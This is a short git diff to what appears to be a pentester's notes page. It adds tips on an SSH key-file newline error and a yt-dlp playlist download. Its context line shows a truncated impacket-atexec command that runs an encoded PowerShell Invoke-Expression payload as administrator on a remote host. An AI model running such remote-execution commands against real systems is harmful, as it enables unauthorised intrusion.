@@ -499,3 +499,25 @@ impacket-atexec administrator:'<password>'@10.10.158.54 "powershell -e SQBFAF…
 ```
 
 </details>
+
+<details>
+
+<summary>If Libcrypto error in SSH</summary>
+
+<figure><img src="../.gitbook/assets/image (372).png" alt=""><figcaption></figcaption></figure>
+
+Ensure that the id\_rsa file has one newline (mandatory!)
+
+<figure><img src="../.gitbook/assets/image (373).png" alt=""><figcaption></figcaption></figure>
+
+</details>
+
+<details>
+
+<summary>Youtube Downloader for Playlist</summary>
+
+```bash
+d:\firefox_download\yt-dlp.exe www.youtube.com/watch?list=PLPBVZbjvnjVkIgFavcRiBKbDSricFJeoD -f bestvideo+bestaudio --merge-output-format mkv
+```
+
+</details>
